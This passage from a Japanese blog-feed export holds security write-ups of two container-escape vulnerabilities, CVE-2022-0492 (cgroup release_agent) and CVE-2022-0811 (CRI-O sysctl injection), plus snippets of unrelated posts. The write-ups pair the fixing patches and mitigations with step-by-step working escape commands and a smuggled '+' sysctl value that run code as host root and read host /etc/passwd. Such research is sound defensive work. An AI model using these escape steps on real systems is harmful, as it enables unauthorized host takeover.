--decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つroot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウントroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep \'cgroup (rw\'cgroup on /mnt type cgroup (rw,relatime,rdma)ここまでで、コンテナ内から release_agent に書き込めるようになりました。続いてコンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置します。今回は /etc/passwd をコンテナ内に出力するスクリプトを作成しています。release_agent に設定するのはプログラムのパスですが、ホストから見た絶対パスを指定する必要があります。root@ab988587a245:/# host_path=`sed -n \'s/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p\' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパスroot@ab988587a245:/# echo \\"$host_path/cmd\\" > /mnt/release_agentroot@ab988587a245:/# echo \'#!/bin/sh\' > /cmdroot@ab988587a245:/# echo \\"cat /etc/passwd > $host_path/output\\" >> /cmdroot@ab988587a245:/# chmod a+x /cmd最後に用意したプログラムを起動するため、cgroup 内のプロセスを空にします。root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成root@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 > /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \\"echo \\\\$\\\\$\\" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加root@ab988587a245:/# cat /output   ← コンテナ内にホストの /etc/passwd が出力されているroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...修正パッチhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of->priv;+   if ((ctx->ns->user_ns != &init_user_ns) ||+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of->kn, false);修正後は上記検証手順での release_agent への書き込みはできません。これは書き込みプロセスが CAP_SYS_ADMIN は持ちますが、init user ns でないためだと理解しています。init user ns かつ CAP_SYS_ADMIN を同時に満たすのは、非特権コンテナにおいては不可能となりました。（厳密にはプロセスの capability と、対象 cgroup の所有 user ns のチェックを行なっています）# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test > /mnt/release_agent bash: echo: write error: Operation not permittedただし特権コンテナでは引き続きコンテナブレイクアウトは可能です。SELinux を設定する等の対策は必要です。コンテナセキュリティコンテナセキュリティと本脆弱性の関係について簡単に見ていきます。seccompseccomp はコンテナ内で実行できるシステムコールを制限します。システムコールをブロックするため、ns を作成する段階でエラーとなります。# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ファイル操作、プログラム実行、capabilities 等を制限します。# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes の場合Kubernetes においては、seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響が出る可能性があります。AppArmor/SELinux は Kubernetes ノードやコンテナランタイムで有効にする必要があります。さらに seccomp は Pod のマニフェストにも設定しなければなりません。また securityContext に適切な設定をすることも重要です。allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities 等でコンテナの機能を制限すれば、今後生まれる脆弱性の予防にもなると考えます。EKS, GKE の場合EKS のノードに使われる Amazon Linux 2 では、rdma のようなコンテナ内に root cgroup がマウントされたサブシステムはないようです。このため cgroup を新規にマウントしても release_agent は見えず、本脆弱性を悪用することはできません。# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE のノードに使われる COS では、デフォルトで AppArmor が有効になっているようです。(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission denied以上のことから EKS, GKE では本脆弱性の影響はなさそうです。さいごに本脆弱性の調査を通じて、コンテナを構成する Linux の要素技術やコンテナセキュリティへの理解が深まりました。Linux の技術について包括的に学ぶのは（個人的には）難しいので、このような脆弱性の調査から学ぶアプローチも良いのではと思います。本記事が皆さんの学習の糧になれば幸いです。参考リンクCVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlコンテナセキュリティhttps://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/04/01] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220401","contentSnippet":"普段は#kubenewsの2022年04月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/qNk58ApYjdg 告知とかニュースっぽいもの Kubernetes Meetup Tokyoで登壇しましたhttps:/...","isoDate":"2022-04-01T12:45:40.000Z","dateMiliSeconds":1648817140000,"authorName":"bells17","authorId":"bells17"},{"title":"CVE-2022-0811 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","contentSnippet":"CRI-O の脆弱性 (CVE-2022-0811) について調べた内容をまとめました。脆弱性の詳細と、関連する CRI-O の実装や Linux の機能を紹介します。CVE-2022-0811 概要CRI-O についてCRI-O 概要pinns による pod へのカーネルパラメータ設定Coredumpエクスプロイト要点検証回避策修正パッチcommit1commit2containerd の場合さいごに参考リンクCVE-2022-0811 概要CVE-2022-0811 は CRI-O の任意コード実行・コンテナブレイクアウトの脆弱性で、報告した CrowdStrike 社は「cr8escape」と呼んでいます。CRI-O の v1.19 以降に影響があり、すでに修正バージョンがリリースされています。 (詳細は Security Advisory を参照)カーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能となっていました。これによりプロセスを異常終了させることでホストの root 権限で任意の操作を行えます。CRI-O についてCRI-O 概要https://github.com/cri-o/cri-oCRI-O は Kubernetes に最適化された軽量な高レベルコンテナランタイムです。CLI ツールは crictl (https://github.com/kubernetes-sigs/cri-tools) を使用します。# cat container-config.json {  \\"metadata\\": {      \\"name\\": \\"ubuntu\\"  },  \\"image\\":{      \\"image\\": \\"ubuntu\\"  },  \\"command\\": [      \\"sleep\\",      \\"3600\\"  ],  \\"log_path\\":\\"ubuntu.0.log\\",  \\"linux\\": {  }}# cat pod-config.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"hdishd83fjaiarawuwk28bcsb\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {    }}# crictl runp pod-config.json   ← pod の起動b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   ← コンテナ作成2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   ← コンテナ起動2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns による pod へのカーネルパラメータ設定CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータ (sysctls) を設定できます。first commit)設定には -s オプションを使用し、key=value の形式で複数のカーネルパラメータを連結して渡すことができます。pinns -s kernel_parameter1=value1+kernel_parameter2=value2設定可能な sysctls は以下の実装で制限されています。https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \\"kernel.shm\\": IpcNamespace,  \\"kernel.msg\\": IpcNamespace,  \\"fs.mqueue.\\": IpcNamespace,  \\"net.\\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \\"%q not allowed with host %s enabled\\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace && hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace && hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace && hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\\"%s not whitelisted\\", s.Key())}sysctls の適用は pinns 内に実装されており、-s オプションの設定値をもとに /proc/sys/ 以下のファイルに書き込みを行なっています。https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\\"sysctl key or value not initialized\\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == \'.\')      *it = \'/\';  _cleanup_close_ int dirfd = open (\\"/proc/sys\\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd < 0))  {    pwarn (\\"failed to open /proc/sys\\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd < 0))  {    pwarnf (\\"failed to open /proc/sys/%s\\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret < 0))  {    pwarnf (\\"failed to write to /proc/sys/%s\\", sysctl_key);    return -1;  }  return 0;}Coredumpプロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力します。Coredump の設定は /proc/sys/kernel/core_pattern に書かれており、ファイルの直接編集や sysctl コマンドで設定を変更できます。# sysctl -w kernel.core_pattern=\\"%e-%s.core\\"kernel.core_pattern には dump の出力先パスを指定しますが、最初文字がパイプ | の場合は指定パスのプログラムを実行します (この場合 dump は標準入力として渡される)。/proc/sys/kernel/core_pattern のデフォルト値として、ubuntu (20.04) では apport というバグレポートツールが指定されています。$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eまた Coredump のファイルサイズ上限は ulimit で設定します。脆弱性は Soft Limit が0でも刺さりそうです。# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usエクスプロイト要点kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照するコンテナ内からは変更不可pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できるCIO-O 内で sysctl のキーを検証しているが、value に + を含む文字列を渡すことでバイパス可能 (以下コードを参照)設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行問題となったコードfunc getSysctlForPinns(sysctls map[string]string) string {  // this assumes there\'s no sysctl with a `+` in it  const pinnsSysctlDelim = \\"+\\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)  // ← \\"\'key1=value1\'+\'key2=value2\'\\" の形で文字列連結する  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}検証脆弱なバージョンの CRI-O で CVE-2022-0811 を検証します。Kubernetes は使用せず、crictl での検証を行いました。# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  true最初にホストに実行させたいプログラムを配置するコンテナを作成します。json、pod-config.json は前述のファイルと同じものです。# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123起動したコンテナにアタッチし、コンテナの root パスにプログラムを配置します。/etc/passwd をコンテナ内の /output に出力するスクリプトを用意しました。# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo \'#!/bin/sh\' > /cmdroot@d33614f0b22d:/# echo \'cat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output\' >> cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmd続いて kernel.core_pattern を変更する pod を作成します。+ で連結した value を記載します。value に記載する kernel.core_pattern には、ホストから見たプログラムの絶対パスを指定しています。# をつけていますが、これは CRI-O の実装で付与されるシングルクォートを無効化する役割があります。# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox2\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"edishd83djaidwnduwk28bcsd\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {  \\"sysctls\\": {      \\"kernel.shm_rmid_forced\\": \\"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod 作成はエラーになりますが、kernel.core_pattern を見ると変更されていることがわかります。# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\'最後に起動中のコンテナ内でプロセスを異常終了させることで、 Coredump の機能を呼び出しホストの root 権限でプログラムを実行させることができます。root@d33614f0b22d:/# tail -f /dev/null &[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...回避策CrowdStrike 社のブログ を参考にしています。CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)OPA 等のポリシーを設定するPSP で sysctls を全てブロックするpinns の -s を除去するラッパーを用意し、crio.conf の pinns_path に設定する修正パッチcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns の -s オプションを生成する箇所で、+ に対してバリデーションを追加しています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \\"-s\\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \\"invalid sysctl\\")+     }+     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there\'s no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there\'s no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \\"+\\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \\"\\", errors.Errorf(\\"\'%s=%s\' is invalid: %s found yet should not be present\\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2文字列の連結をやめ、-s をパラメータ毎に設定する修正がされています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \\"invalid sysctl\\")-     }-     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \\"-s\\", fmt.Sprintf(\\"%s=%s\\", key, value))    }      ...  }containerd の場合他のコンテナランタイムがどうなっているか気になったので、containerd の実装を調べてみました。https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn\'t completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \\"kernel.msgmax\\":          true,        \\"kernel.msgmnb\\":          true,        \\"kernel.msgmni\\":          true,        \\"kernel.sem\\":             true,        \\"kernel.shmall\\":          true,        \\"kernel.shmmax\\":          true,        \\"kernel.shmmni\\":          true,        \\"kernel.shm_rmid_forced\\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \\"fs.mqueue.\\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts ipc namespace\\", s)            }        }        if strings.HasPrefix(s, \\"net.\\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts network namespace\\", s)            }        }        return fmt.Errorf(\\"sysctl %q is not in a separate kernel namespace\\", s)    }    return nil}CRI-O は pinns により独自の sysctls 設定を実装していますが、pod 作成時に設定する都合上、 OCI の機能を使わない方法を選んだのかもしれません (根拠はないです)。さいごに初めて CRI-O を触りましたが、Docker や containerd とはかなり仕組みが異なることがわかりました。脆弱性の調査を通して CRI-O の実装や Linux の機能に触れることができ、良い機会を得られたと思います。内容に誤りが含まれる可能性がありますので、何かお気づきの方はご指摘等よろしくお願いします。参考リンクhttps://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"nnn(Terminal file manager)を使ってみる","link":"https://zenn.dev/tayusa/articles/1f87e798ccbed0","contentSnippet":"nnnとはhttps://github.com/jarun/nnnターミナル上で動作するファイルマネージャー 良い点軽量で高速な動作を保つために機能をプラグインとして外出しして拡張できる設計になってますプラグインはシェルスクリプトなどで簡単に記述できますキーバインドはviライクですtmuxを利用してる状態の画像表示も問題ないですターミナルはkittyを利用しています インストールUbuntu$ sudo apt install nnnArch Linux$ sudo pacman -S nnnMacOS$ bre...","isoDate":"2022-03-27T13:27:45.000Z","dateMiliSeconds":1648387665000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[2022/03/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220325","contentSnippet":"普段は#kubenewsの2022年03月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/NewvQB5q-QU 告知とかニュースっぽいもの Cloud Native Database Meetup #4https:...","isoDate":"2022-03-25T12:55:35.000Z","dateMiliSeconds":1648212935000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/03/18] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220318","contentSnippet":"普段は#kubenewsの2022年03月18日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/y7DMp3aqCFM 告知とかニュースっぽいもの 3-shake SRE Tech Talk #3https://youtu...","isoDate":"2022-03-18T12:50:45.000Z","dateMiliSeconds":1647607845000,"authorName":"bells17","authorId":"bells17"},{"title":"脆弱性に学ぶコンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/cui-ruo-xing-nixue-bukontenasekiyuritei","contentSnippet":"3-shake SRE Tech Talk #3 の登壇資料です。\\rhttps://3-shake.connpass.com/event/241284/","isoDate":"2022-03-18T04:00:00.000Z","dateMiliSeconds":1647576000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Observability Conference 2022 に登壇しました","link":"https://zenn.dev/nwiizo/articles/d837b78914de23","contentSnippet":"「Dapr の概念と実装から学ぶ Observability への招待」 というタイトルで登壇します。https://event.cloudnativedays.jp/o11y2022/talks/1382:embed:cite セッション概要Dapr は CloudNative な技術を背景に持つ分散アプリケーションランタイムです。本セッションでは Dapr の Observability に関する各種機能と、その実装について解説していきます。さらにスリーシェイクの Dapr と Observability への取り組みに関してもご紹介します。Dapr の機能でカバーできる点...","isoDate":"2022-03-11T04:02:18.000Z","dateMiliSeconds":1646971338000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"[2022/03/04] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220304","contentSnippet":"普段は#kubenewsの2022年03月04日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + 